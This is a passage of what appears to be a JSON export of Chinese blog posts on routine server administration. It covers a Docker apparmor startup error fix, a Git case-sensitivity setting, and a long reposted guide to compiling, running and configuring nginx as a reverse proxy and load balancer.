(/var/run/docker.sock) \nINFO[0000] +job init_networkdriver()                    \nINFO[0000] -job init_networkdriver() = OK (0)           \nWARN[0000] Your kernel does not support cgroup swap limit. \nFATA[0000] Shutting down daemon due to errors: Error loading docker apparmor profile: fork/exec /sbin/apparmor_parser: no such file or directory () `\n解决办法：\n```\n$ sudo apt-get install apparmor\n```",
			"tags":"docker,mint",
			"id":"51488966",
			"categories":"linux,docker",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年05月18日 13:57:49",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"otherGit中启用大小写敏感git config core.ignorecase false",
			"title":"Git日常使用记录",
			"type":"original",
			"content":"<h1 id=\"other\">other</h1>\n\n<h2 id=\"git中启用大小写敏感\">Git中启用大小写敏感</h2>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\">git config core.ignorecase <span class=\"hljs-literal\">false</span> </code></pre>",
			"markdowncontent":"#other\n##Git中启用大小写敏感\n```\ngit config core.ignorecase false \n```\n",
			"tags":"",
			"id":"51443483",
			"categories":"git使用",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年05月18日 12:53:47",
			"articleedittype":1,
			"private":0,
			"channel":"12",
			"description":"转载自sean  nginx在工作中已经有好几个环境在使用了，每次都是重新去网上扒博客，各种编译配置，今天自己也整理一份安装文档和nginx.conf配置选项的说明，留作以后参考。像负载均衡配置（包括健康检查）、缓存（包括清空缓存）配置实例，请参考 http://seanlook.com/2015/05/17/nginx-install-and-config ，ssl加密请参考 http://sea",
			"title":"nginx服务器安装及配置文件详解",
			"type":"repost",
			"content":"<blockquote>\n  <p>转载自<a href=\"http://seanlook.com/2015/05/17/nginx-install-and-config/\">sean</a></p>\n</blockquote>\n\n<hr>\n\n<blockquote>\n  <p>nginx在工作中已经有好几个环境在使用了，每次都是重新去网上扒博客，各种编译配置，今天自己也整理一份安装文档和nginx.conf配置选项的说明，留作以后参考。像负载均衡配置（包括健康检查）、缓存（包括清空缓存）配置实例，请参考 <a href=\"http://seanlook.com/2015/05/17/nginx-install-and-config\">http://seanlook.com/2015/05/17/nginx-install-and-config</a> ，ssl加密请参考 <a href=\"http://seanlook.com/2015/05/28/nginx-ssl/\">http://seanlook.com/2015/05/28/nginx-ssl/</a> 。</p>\n</blockquote>\n\n\n\n<h1 id=\"1-安装nginx\">1. 安装nginx</h1>\n\n\n\n<h2 id=\"11-选择稳定版本\">1.1 选择稳定版本</h2>\n\n<p>我们编译安装nginx来定制自己的模块，机器CentOS 6.2 x86_64。首先安装缺少的依赖包：</p>\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">yum <span class=\"hljs-attribute\">-y</span> install gcc gcc<span class=\"hljs-attribute\">-c</span><span class=\"hljs-subst\">++</span> make libtool zlib zlib<span class=\"hljs-attribute\">-devel</span> openssl openssl<span class=\"hljs-attribute\">-devel</span> pcre pcre<span class=\"hljs-attribute\">-devel</span></code></pre>\n\n<p>这些软件包如果yum上没有的话可以下载源码来编译安装，只是要注意编译时默认安装的目录，确保下面在安装nginx时能够找到这些动态库文件（ldconfig）。</p>\n\n<p>从 <a href=\"http://nginx.org/en/download.html\">http://nginx.org/en/download.html</a> 下载稳定版nginx-1.6.3.tar.gz到/usr/local/src下解压。</p>\n\n<p>为了后续准备我们另外下载2个插件模块：<strong>nginx_upstream_check_module-0.3.0.tar.gz </strong>—— 检查后端服务器的状态，<strong><em>nginx-goodies-nginx-sticky-module-ng-bd312d586752.tar.gz</em></strong>（建议在/usr/local/src*下解压后将目录重命名为<strong>nginx-sticky-module-ng-1.2.5</strong>） —— 后端做负载均衡解决session sticky问题（与upstream_check模块结合使用需要另外打补丁，请参考nginx负载均衡配置实战）。</p>\n\n<p>请注意插件与nginx的版本兼容问题，一般插件越新越好，nginx不用追新，稳定第一。nginx-1.4.7，nginx-sticky-module-1.1，nginx_upstream_check_module-0.2.0，这个搭配也没问题。sticky-1.1与nginx-1.6版本由于更新没跟上编译出错。（可以直接使用Tengine，默认就包括了这些模块）</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs coffeescript\">[root<span class=\"hljs-property\">@cachets</span> nginx-<span class=\"hljs-number\">1.6</span><span class=\"hljs-number\">.3</span>]<span class=\"hljs-comment\"># pwd</span>\n/usr/local/src/nginx-<span class=\"hljs-number\">1.6</span><span class=\"hljs-number\">.3</span>\n[root<span class=\"hljs-property\">@cachets</span> nginx-<span class=\"hljs-number\">1.6</span><span class=\"hljs-number\">.3</span>]<span class=\"hljs-comment\"># ./configure --prefix=/usr/local/nginx-1.6 --with-pcre \\</span>\n&gt; --<span class=\"hljs-reserved\">with</span>-http_stub_status_module --<span class=\"hljs-reserved\">with</span>-http_ssl_module \\\n&gt; --<span class=\"hljs-reserved\">with</span>-http_gzip_static_module --<span class=\"hljs-reserved\">with</span>-http_realip_module \\\n&gt; --add-<span class=\"hljs-built_in\">module</span>=../nginx_upstream_check_module-<span class=\"hljs-number\">0.3</span><span class=\"hljs-number\">.0</span>\n[root<span class=\"hljs-property\">@cachets</span> nginx-<span class=\"hljs-number\">1.6</span><span class=\"hljs-number\">.3</span>]<span class=\"hljs-comment\"># make &amp;&amp; make install</span></code></pre>\n\n\n\n<h2 id=\"12-常用编译选项说明\">1.2 常用编译选项说明</h2>\n\n<p>nginx大部分常用模块，编译时./configure –help以–without开头的都默认安装。</p>\n\n<p><strong>–prefix=PATH</strong> ： 指定nginx的安装目录。默认 /usr/local/nginx <br>\n<strong>–conf-path=PATH</strong> ： 设置nginx.conf配置文件的路径。nginx允许使用不同的配置文件启动，通过命令行中的-c选项。默认为prefix/conf/nginx.conf <br>\n<strong>–user=name</strong>： 设置nginx工作进程的用户。安装完成后，可以随时在nginx.conf配置文件更改user指令。默认的用户名是nobody。–group=name类似 <br>\n<strong>–with-pcre</strong> ： 设置PCRE库的源码路径，如果已通过yum方式安装，使用–with-pcre自动找到库文件。使用–with-pcre=PATH时，需要从PCRE网站下载pcre库的源码（版本4.4 - 8.30）并解压，剩下的就交给Nginx的./configure和make来完成。perl正则表达式使用在location指令和 ngx_http_rewrite_module模块中。 <br>\n<strong>–with-zlib=PATH</strong> ： 指定 zlib（版本1.1.3 - 1.2.5）的源码解压目录。在默认就启用的网络传输压缩模块ngx_http_gzip_module时需要使用zlib 。 <br>\n<strong>–with-http_ssl_module</strong> ： 使用https协议模块。默认情况下，该模块没有被构建。前提是openssl与openssl-devel已安装 <br>\n<strong>–with-http_stub_status_module</strong> ： 用来监控 Nginx 的当前状态 <br>\n<strong>–with-http_realip_module</strong> ： 通过这个模块允许我们改变客户端请求头中客户端IP地址值(例如X-Real-IP 或 X-Forwarded-For)，意义在于能够使得后台服务器记录原始客户端的IP地址 <br>\n<strong>–add-module=PATH</strong> ： 添加第三方外部模块，如nginx-sticky-module-ng或缓存模块。每次添加新的模块都要重新编译（Tengine可以在新加入module时无需重新编译） <br>\n再提供一种编译方案：</p>\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\"><span class=\"hljs-built_in\">.</span>/configure <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span>prefix<span class=\"hljs-subst\">=</span>/usr <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span>sbin<span class=\"hljs-attribute\">-path</span><span class=\"hljs-subst\">=</span>/usr/sbin/nginx <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span>conf<span class=\"hljs-attribute\">-path</span><span class=\"hljs-subst\">=</span>/etc/nginx/nginx<span class=\"hljs-built_in\">.</span>conf <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span>error<span class=\"hljs-attribute\">-log</span><span class=\"hljs-attribute\">-path</span><span class=\"hljs-subst\">=</span>/<span class=\"hljs-built_in\">var</span>/<span class=\"hljs-keyword\">log</span>/nginx/error<span class=\"hljs-built_in\">.</span><span class=\"hljs-keyword\">log</span> <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span>http<span class=\"hljs-attribute\">-log</span><span class=\"hljs-attribute\">-path</span><span class=\"hljs-subst\">=</span>/<span class=\"hljs-built_in\">var</span>/<span class=\"hljs-keyword\">log</span>/nginx/access<span class=\"hljs-built_in\">.</span><span class=\"hljs-keyword\">log</span> <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span>pid<span class=\"hljs-attribute\">-path</span><span class=\"hljs-subst\">=</span>/<span class=\"hljs-built_in\">var</span>/run/nginx/nginx<span class=\"hljs-built_in\">.</span>pid  <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span>lock<span class=\"hljs-attribute\">-path</span><span class=\"hljs-subst\">=</span>/<span class=\"hljs-built_in\">var</span>/lock/nginx<span class=\"hljs-built_in\">.</span>lock <span class=\"hljs-subst\">\\</span>   \n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span>user<span class=\"hljs-subst\">=</span>nginx <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span><span class=\"hljs-keyword\">group</span><span class=\"hljs-subst\">=</span>nginx <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span><span class=\"hljs-keyword\">with</span><span class=\"hljs-attribute\">-http_ssl_module</span> <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span><span class=\"hljs-keyword\">with</span><span class=\"hljs-attribute\">-http_stub_status_module</span> <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span><span class=\"hljs-keyword\">with</span><span class=\"hljs-attribute\">-http_gzip_static_module</span> <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span>http<span class=\"hljs-attribute\">-client</span><span class=\"hljs-attribute\">-body</span><span class=\"hljs-attribute\">-temp</span><span class=\"hljs-attribute\">-path</span><span class=\"hljs-subst\">=</span>/<span class=\"hljs-built_in\">var</span>/tmp/nginx/client<span class=\"hljs-subst\">/</span> <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span>http<span class=\"hljs-attribute\">-proxy</span><span class=\"hljs-attribute\">-temp</span><span class=\"hljs-attribute\">-path</span><span class=\"hljs-subst\">=</span>/<span class=\"hljs-built_in\">var</span>/tmp/nginx/proxy<span class=\"hljs-subst\">/</span> <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span>http<span class=\"hljs-attribute\">-fastcgi</span><span class=\"hljs-attribute\">-temp</span><span class=\"hljs-attribute\">-path</span><span class=\"hljs-subst\">=</span>/<span class=\"hljs-built_in\">var</span>/tmp/nginx/fcgi<span class=\"hljs-subst\">/</span> <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span>http<span class=\"hljs-attribute\">-uwsgi</span><span class=\"hljs-attribute\">-temp</span><span class=\"hljs-attribute\">-path</span><span class=\"hljs-subst\">=</span>/<span class=\"hljs-built_in\">var</span>/tmp/nginx/uwsgi <span class=\"hljs-subst\">\\</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span><span class=\"hljs-keyword\">with</span><span class=\"hljs-attribute\">-pcre</span><span class=\"hljs-subst\">=</span><span class=\"hljs-built_in\">..</span>/pcre<span class=\"hljs-subst\">-</span><span class=\"hljs-number\">7.8</span>\n<span class=\"hljs-subst\">&gt;</span> <span class=\"hljs-subst\">--</span><span class=\"hljs-keyword\">with</span><span class=\"hljs-attribute\">-zlib</span><span class=\"hljs-subst\">=</span><span class=\"hljs-built_in\">..</span>/zlib<span class=\"hljs-subst\">-</span><span class=\"hljs-number\">1.2</span><span class=\"hljs-number\">.3</span></code></pre>\n\n\n\n<h2 id=\"13-启动关闭nginx\">1.3 启动关闭nginx</h2>\n\n<p>检查配置文件是否正确</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs vala\"><span class=\"hljs-preprocessor\"># /usr/local/nginx-1.6/sbin/nginx -t </span>\n<span class=\"hljs-preprocessor\"># ./sbin/nginx -V     # 可以看到编译选项</span>\n<span class=\"hljs-preprocessor\">## 启动、关闭</span>\n<span class=\"hljs-preprocessor\"># ./sbin/nginx        # 默认配置文件 conf/nginx.conf，-c 指定</span>\n<span class=\"hljs-preprocessor\"># ./sbin/nginx -s stop</span>\n或 pkill nginx\n<span class=\"hljs-preprocessor\">## 重启，不会改变启动时指定的配置文件</span>\n<span class=\"hljs-preprocessor\"># ./sbin/nginx -s reload</span></code></pre>\n\n<p>或 kill -HUP <code>cat /usr/local/nginx-1.6/logs/nginx.pid</code> <br>\n当然也可以将 nginx 作为系统服务管理，下载 nginx 到/etc/init.d/，修改里面的路径然后赋予可执行权限。</p>\n\n<pre class=\"prettyprint\"><code class=\" hljs vala\"><span class=\"hljs-preprocessor\"># service nginx {start|stop|status|restart|reload|configtest}</span></code></pre>\n\n\n\n<h2 id=\"14-yum安装\">1.4 yum安装</h2>\n\n<p>yum安装rpm包会比编译安装简单很多，默认会安装许多模块，但缺点是如果你想以后安装第三方模块那就没办法了。</p>\n\n<pre class=\"prettyprint\"><code class=\" hljs ruby\"><span class=\"hljs-comment\"># vi /etc/yum.repo.d/nginx.repo </span>\n[nginx] \nname=nginx repo \nbaseurl=<span class=\"hljs-symbol\">http:</span>/<span class=\"hljs-regexp\">/nginx.org/packages</span><span class=\"hljs-regexp\">/centos/</span><span class=\"hljs-variable\">$releasever</span>/<span class=\"hljs-variable\">$basearch</span>/ \ngpgcheck=<span class=\"hljs-number\">0</span> \nenabled=<span class=\"hljs-number\">1</span></code></pre>\n\n<p>剩下的就<code>yum install nginx</code>搞定，也可以yum install nginx-1.6.3安装指定版本（前提是你去packages里看到有对应的版本，默认是最新版稳定版）。</p>\n\n\n\n<h3 id=\"2-nginxconf配置文件\">2. nginx.conf配置文件</h3>\n\n<p>Nginx配置文件主要分成四部分：main（全局设置）、server（主机设置）、upstream（上游服务器设置，主要为反向代理、负载均衡相关配置）和 location（URL匹配特定位置后的设置），每部分包含若干个指令。main部分设置的指令将影响其它所有部分的设置；server部分的指令主要用于指定虚拟主机域名、IP和端口；upstream的指令用于设置一系列的后端服务器，设置反向代理及后端服务器的负载均衡；location部分用于匹配网页位置（比如，根目录“/”,“/images”,等等）。他们之间的关系式：server继承main，location继承server；upstream既不会继承指令也不会被继承。它有自己的特殊指令，不需要在其他地方的应用。</p>\n\n<p>当前nginx支持的几个指令上下文：</p>\n\n\n\n<h4 id=\"21-通用\">2.1 通用</h4>\n\n<p>下面的nginx.conf简单的实现nginx在前端做反向代理服务器的例子，处理js、png等静态文件，jsp等动态请求转发到其它服务器tomcat：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs nginx\"><span class=\"hljs-title\">user</span>  www www;\n<span class=\"hljs-title\">worker_processes</span>  <span class=\"hljs-number\">2</span>;\n\n<span class=\"hljs-title\">error_log</span>  logs/error.log;\n<span class=\"hljs-comment\">#error_log  logs/error.log  notice;</span>\n<span class=\"hljs-comment\">#error_log  logs/error.log  info;</span>\n\n<span class=\"hljs-title\">pid</span>        logs/nginx.pid;\n\n\n<span class=\"hljs-title\">events</span> {\n    <span class=\"hljs-title\">use</span> <span class=\"hljs-built_in\">epoll</span>;\n    <span class=\"hljs-title\">worker_connections</span>  <span class=\"hljs-number\">2048</span>;\n}\n\n\n<span class=\"hljs-title\">http</span> {\n    <span class=\"hljs-title\">include</span>       mime.types;\n    <span class=\"hljs-title\">default_type</span>  application/octet-stream;\n\n    <span class=\"hljs-comment\">#log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '</span>\n    <span class=\"hljs-comment\">#                  '$status $body_bytes_sent \"$http_referer\" '</span>\n    <span class=\"hljs-comment\">#                  '\"$http_user_agent\" \"$http_x_forwarded_for\"';</span>\n\n    <span class=\"hljs-comment\">#access_log  logs/access.log  main;</span>\n\n    <span class=\"hljs-title\">sendfile</span>        <span class=\"hljs-built_in\">on</span>;\n    <span class=\"hljs-comment\"># tcp_nopush     on;</span>\n\n    <span class=\"hljs-title\">keepalive_timeout</span>  <span class=\"hljs-number\">65</span>;\n\n  <span class=\"hljs-comment\"># gzip压缩功能设置</span>\n    <span class=\"hljs-title\">gzip</span> <span class=\"hljs-built_in\">on</span>;\n    <span class=\"hljs-title\">gzip_min_length</span> <span class=\"hljs-number\">1k</span>;\n    <span class=\"hljs-title\">gzip_buffers</span>    <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">16k</span>;\n    <span class=\"hljs-title\">gzip_http_version</span> <span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">0</span>;\n    <span class=\"hljs-title\">gzip_comp_level</span> <span class=\"hljs-number\">6</span>;\n    <span class=\"hljs-title\">gzip_types</span> text/html text/plain text/css text/javascript application/json application/javascript application/x-javascript application/xml;\n    <span class=\"hljs-title\">gzip_vary</span> <span class=\"hljs-built_in\">on</span>;\n\n  <span class=\"hljs-comment\"># http_proxy 设置</span>\n    <span class=\"hljs-title\">client_max_body_size</span>   <span class=\"hljs-number\">10m</span>;\n    <span class=\"hljs-title\">client_body_buffer_size</span>   <span class=\"hljs-number\">128k</span>;\n    <span class=\"hljs-title\">proxy_connect_timeout</span>   <span class=\"hljs-number\">75</span>;\n    <span class=\"hljs-title\">proxy_send_timeout</span>   <span class=\"hljs-number\">75</span>;\n    <span class=\"hljs-title\">proxy_read_timeout</span>   <span class=\"hljs-number\">75</span>;\n    <span class=\"hljs-title\">proxy_buffer_size</span>   <span class=\"hljs-number\">4k</span>;\n    <span class=\"hljs-title\">proxy_buffers</span>   <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">32k</span>;\n    <span class=\"hljs-title\">proxy_busy_buffers_size</span>   <span class=\"hljs-number\">64k</span>;\n    <span class=\"hljs-title\">proxy_temp_file_write_size</span>  <span class=\"hljs-number\">64k</span>;\n    <span class=\"hljs-title\">proxy_temp_path</span>   /usr/local/nginx/proxy_temp <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">2</span>;\n\n  <span class=\"hljs-comment\"># 设定负载均衡后台服务器列表 </span>\n    <span class=\"hljs-title\">upstream</span>  backend  { \n              <span class=\"hljs-comment\">#ip_hash; </span>\n              <span class=\"hljs-title\">server</span>   <span class=\"hljs-number\">192.168.10.100:8080</span> max_fails=<span class=\"hljs-number\">2</span> fail_timeout=<span class=\"hljs-number\">30s</span> ;  \n              <span class=\"hljs-title\">server</span>   <span class=\"hljs-number\">192.168.10.101:8080</span> max_fails=<span class=\"hljs-number\">2</span> fail_timeout=<span class=\"hljs-number\">30s</span> ;  \n    }\n\n  <span class=\"hljs-comment\"># 很重要的虚拟主机配置</span>\n    <span class=\"hljs-title\">server</span> {\n        <span class=\"hljs-title\">listen</span>       <span class=\"hljs-number\">80</span>;\n        <span class=\"hljs-title\">server_name</span>  itoatest.example.com;\n        <span class=\"hljs-title\">root</span>   /apps/oaapp;\n\n        <span class=\"hljs-title\">charset</span> utf-<span class=\"hljs-number\">8</span>;\n        <span class=\"hljs-title\">access_log</span>  logs/host.access.log  main;\n\n        <span class=\"hljs-comment\">#对 / 所有做负载均衡+反向代理</span>\n        <span class=\"hljs-title\">location</span> / {\n            <span class=\"hljs-title\">root</span>   /apps/oaapp;\n            <span class=\"hljs-title\">index</span>  index.jsp index.html index.htm;\n\n            <span class=\"hljs-title\">proxy_pass</span>        <span class=\"hljs-url\">http://backend</span>;  \n            <span class=\"hljs-title\">proxy_redirect</span> <span class=\"hljs-built_in\">off</span>;\n            <span class=\"hljs-comment\"># 后端的Web服务器可以通过X-Forwarded-For获取用户真实IP</span>\n            <span class=\"hljs-title\">proxy_set_header</span>  Host  <span class=\"hljs-variable\">$host</span>;\n            <span class=\"hljs-title\">proxy_set_header</span>  X-Real-IP  <span class=\"hljs-variable\">$remote_addr</span>;  \n            <span class=\"hljs-title\">proxy_set_header</span>  X-Forwarded-For  <span class=\"hljs-variable\">$proxy_add_x_forwarded_for</span>;\n            <span class=\"hljs-title\">proxy_next_upstream</span> <span class=\"hljs-built_in\">error</span> timeout invalid_header http_500 http_502 http_503 http_504;\n\n        }\n\n        <span class=\"hljs-comment\">#静态文件，nginx自己处理，不去backend请求tomcat</span>\n        <span class=\"hljs-title\">location</span>  <span class=\"hljs-regexp\">~* /download/</span> {  \n            <span class=\"hljs-title\">root</span> /apps/oa/fs;  \n\n        }\n        <span class=\"hljs-title\">location</span> <span class=\"hljs-regexp\">~ .*\\.(gif|jpg|jpeg|bmp|png|ico|txt|js|css)$</span>   \n        {   \n            <span class=\"hljs-title\">root</span> /apps/oaapp;   \n            <span class=\"hljs-title\">expires</span>      <span class=\"hljs-number\">7d</span>; \n        }\n        <span class=\"hljs-title\">location</span> /nginx_status {\n            <span class=\"hljs-title\">stub_status</span> <span class=\"hljs-built_in\">on</span>;\n            <span class=\"hljs-title\">access_log</span> <span class=\"hljs-built_in\">off</span>;\n            <span class=\"hljs-title\">allow</span> <span class=\"hljs-number\">192.168.10.0</span>/<span class=\"hljs-number\">24</span>;\n            <span class=\"hljs-title\">deny</span> all;\n        }\n\n        <span class=\"hljs-title\">location</span> <span class=\"hljs-regexp\">~ ^/(WEB-INF)/</span> {   \n            <span class=\"hljs-title\">deny</span> all;   \n        }\n        <span class=\"hljs-comment\">#error_page  404              /404.html;</span>\n\n        <span class=\"hljs-comment\"># redirect server error pages to the static page /50x.html</span>\n        <span class=\"hljs-comment\">#</span>\n        <span class=\"hljs-title\">error_page</span>   <span class=\"hljs-number\">500</span> <span class=\"hljs-number\">502</span> <span class=\"hljs-number\">503</span> <span class=\"hljs-number\">504</span>  /50x.html;\n        <span class=\"hljs-title\">location</span> = /50x.html {\n            <span class=\"hljs-title\">root</span>   html;\n        }\n    }\n  <span class=\"hljs-comment\">## 其它虚拟主机，server 指令开始</span>\n}</code></pre>\n\n\n\n<h3 id=\"22-常用指令说明\">2.2 常用指令说明</h3>\n\n\n\n<h4 id=\"221-main全局配置\">2.2.1 main全局配置</h4>\n\n<p>nginx在运行时与具体业务功能（比如http服务或者email服务代理）无关的一些参数，比如工作进程数，运行的身份等。</p>\n\n<p><code>woker_processes 2</code> <br>\n在配置文件的顶级main部分，worker角色的工作进程的个数，master进程是接收并分配请求给worker处理。这个数值简单一点可以设置为cpu的核数grep ^processor /proc/cpuinfo | wc -l，也是 auto 值，如果开启了ssl和gzip更应该设置成与逻辑CPU数量一样甚至为2倍，可以减少I/O操作。如果nginx服务器还有其它服务，可以考虑适当减少。</p>\n\n<p><code>worker_cpu_affinity</code> <br>\n也是写在main部分。在高并发情况下，通过设置cpu粘性来降低由于多CPU核切换造成的寄存器等现场重建带来的性能损耗。如worker_cpu_affinity 0001 0010 0100 1000; （四核）。</p>\n\n<p><code>worker_connections 2048</code> <br>\n写在events部分。每一个worker进程能并发处理（发起）的最大连接数（包含与客户端或后端被代理服务器间等所有连接数）。nginx作为反向代理服务器，计算公式 最大连接数 = worker_processes * worker_connections/4，所以这里客户端最大连接数是1024，这个可以增到到8192都没关系，看情况而定，但不能超过后面的worker_rlimit_nofile。当nginx作为http服务器时，计算公式里面是除以2。</p>\n\n<p><code>worker_rlimit_nofile 10240</code> <br>\n写在main部分。默认是没有设置，可以限制为操作系统最大的限制65535。</p>\n\n<p><code>use epoll</code> <br>\n写在events部分。在Linux操作系统下，nginx默认使用epoll事件模型，得益于此，nginx在Linux操作系统下效率相当高。同时Nginx在OpenBSD或FreeBSD操作系统上采用类似于epoll的高效事件模型kqueue。在操作系统不支持这些高效模型时才使用select。</p>\n\n\n\n<h4 id=\"222-http服务器\">2.2.2 http服务器</h4>\n\n<p>与提供http服务相关的一些配置参数。例如：是否使用keepalive啊，是否使用gzip进行压缩等。</p>\n\n<p><code>sendfile on</code> <br>\n开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，减少用户空间到内核空间的上下文切换。对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。</p>\n\n<p><code>keepalive_timeout 65</code>: 长连接超时时间，单位是秒，这个参数很敏感，涉及浏览器的种类、后端服务器的超时设置、操作系统的设置，可以另外起一片文章了。长连接请求大量小文件的时候，可以减少重建连接的开销，但假如有大文件上传，65s内没上传完成会导致失败。如果设置时间过长，用户又多，长时间保持连接会占用大量资源。</p>\n\n<p><code>send_timeout</code>: 用于指定响应客户端的超时时间。这个超时仅限于两个连接活动之间的时间，如果超过这个时间，客户端没有任何活动，Nginx将会关闭连接。</p>\n\n<p><code>client_max_body_size 10m</code> <br>\n允许客户端请求的最大单文件字节数。如果有上传较大文件，请设置它的限制值</p>\n\n<p><code>client_body_buffer_size 128k</code> <br>\n缓冲区代理缓冲用户端请求的最大字节数 <br>\n模块http_proxy： <br>\n这个模块实现的是nginx作为反向代理服务器的功能，包括缓存功能（另见文章）</p>\n\n<p><code>proxy_connect_timeout 60</code> <br>\nnginx跟后端服务器连接超时时间(代理连接超时) <br>\n<code>proxy_read_timeout 60</code> <br>\n连接成功后，与后端服务器两个成功的响应操作之间超时时间(代理接收超时)</p>\n\n<p><code>proxy_buffer_size 4k</code> <br>\n设置代理服务器（nginx）从后端realserver读取并保存用户头信息的缓冲区大小，默认与proxy_buffers大小相同，其实可以将这个指令值设的小一点</p>\n\n<p><code>proxy_buffers 4 32k</code> <br>\nproxy_buffers缓冲区，nginx针对单个连接缓存来自后端realserver的响应，网页平均在32k以下的话，这样设置</p>\n\n<p><code>proxy_busy_buffers_size 64k</code> <br>\n高负荷下缓冲大小（proxy_buffers*2）</p>\n\n<p><code>proxy_max_temp_file_size</code> <br>\n当 proxy_buffers 放不下后端服务器的响应内容时，会将一部分保存到硬盘的临时文件中，这个值用来设置最大临时文件大小，默认1024M，它与 proxy_cache 没有关系。大于这个值，将从upstream服务器传回。设置为0禁用。</p>\n\n<p><code>proxy_temp_file_write_size 64k</code> <br>\n当缓存被代理的服务器响应到临时文件时，这个选项限制每次写临时文件的大小。proxy_temp_path（可以在编译的时候）指定写到哪那个目录。</p>\n\n<p>proxy_pass，proxy_redirect见 location 部分。</p>\n\n<p>模块http_gzip：</p>\n\n<p><code>gzip on</code> : 开启gzip压缩输出，减少网络传输。 <br>\n<code>gzip_min_length 1k</code>： 设置允许压缩的页面最小字节数，页面字节数从header头得content-length中进行获取。默认值是20。建议设置成大于1k的字节数，小于1k可能会越压越大。 <br>\n<code>gzip_buffers 4 16k</code>： 设置系统获取几个单位的缓存用于存储gzip的压缩结果数据流。4 16k代表以16k为单位，安装原始数据大小以16k为单位的4倍申请内存。 <br>\n<code>gzip_http_version 1.0</code>： 用于识别 http 协议的版本，早期的浏览器不支持 Gzip 压缩，用户就会看到乱码，所以为了支持前期版本加上了这个选项，如果你用了 Nginx 的反向代理并期望也启用 Gzip 压缩的话，由于末端通信是 http/1.0，故请设置为 1.0。 <br>\n<code>gzip_comp_level 6</code>： gzip压缩比，1压缩比最小处理速度最快，9压缩比最大但处理速度最慢(传输快但比较消耗cpu) <br>\n<code>gzip_types</code>：匹配mime类型进行压缩，无论是否指定,”text/html”类型总是会被压缩的。 <br>\n<code>gzip_proxied any</code>： Nginx作为反向代理的时候启用，决定开启或者关闭后端服务器返回的结果是否压缩，匹配的前提是后端服务器必须要返回包含”Via”的 header头。 <br>\n<code>gzip_vary on</code>： 和http头有关系，会在响应头加个 Vary: Accept-Encoding ，可以让前端的缓存服务器缓存经过gzip压缩的页面，例如，用Squid缓存经过Nginx压缩的数据。。 <br>\n2.2.3 server虚拟主机</p>\n\n<p>http服务上支持若干虚拟主机。每个虚拟主机一个对应的server配置项，配置项里面包含该虚拟主机相关的配置。在提供mail服务的代理时，也可以建立若干server。每个server通过监听地址或端口来区分。</p>\n\n<p>listen <br>\n监听端口，默认80，小于1024的要以root启动。可以为listen *:80、listen 127.0.0.1:80等形式。</p>\n\n<p>server_name <br>\n服务器名，如localhost、www.example.com，可以通过正则匹配。</p>\n\n<p>模块http_stream <br>\n这个模块通过一个简单的调度算法来实现客户端IP到后端服务器的负载均衡，upstream后接负载均衡器的名字，后端realserver以 host:port options; 方式组织在 {} 中。如果后端被代理的只有一台，也可以直接写在 proxy_pass 。</p>\n\n<p>2.2.4 location</p>\n\n<p>http服务中，某些特定的URL对应的一系列配置项。</p>\n\n<p><code>root /var/www/html</code> <br>\n定义服务器的默认网站根目录位置。如果locationURL匹配的是子目录或文件，root没什么作用，一般放在server指令里面或/下。</p>\n\n<p><code>index index.jsp index.html index.htm</code> <br>\n定义路径下默认访问的文件名，一般跟着root放</p>\n\n<p><code>proxy_pass http:/backend</code> <br>\n请求转向backend定义的服务器列表，即反向代理，对应upstream负载均衡器。也可以proxy_pass <a href=\"http://ip:port\">http://ip:port</a>。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">proxy_redirect off;\nproxy_set_header Host <span class=\"hljs-variable\">$host</span>;\nproxy_set_header X<span class=\"hljs-attribute\">-Real</span><span class=\"hljs-attribute\">-IP</span> <span class=\"hljs-variable\">$remote_addr</span>;\nproxy_set_header X<span class=\"hljs-attribute\">-Forwarded</span><span 